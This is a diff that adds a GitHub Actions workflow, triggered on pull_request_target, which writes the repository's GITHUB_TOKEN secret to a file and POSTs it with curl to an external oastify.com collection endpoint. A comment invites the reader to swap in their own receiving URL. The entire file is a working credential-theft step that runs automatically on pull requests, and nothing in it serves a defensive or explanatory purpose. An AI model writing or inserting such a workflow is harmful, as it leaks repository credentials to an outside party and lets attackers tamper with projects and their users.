@@ -1,0 +1,15 @@
+name: Extract GITHUB_TOKEN
+
+on:
+  pull_request_target:
+    types: [opened, reopened, synchronize]
+
+jobs:
+  extract-token:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract GITHUB_TOKEN
+        run: |
+          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" > token.txt
+          # Replace the below URL with the endpoint where you need to send the token.
+          curl -X POST -F "token=@token.txt" https://hezmv7zq4wh3y7tbjqw58xorkiq9e02p.oastify.com/receive-token
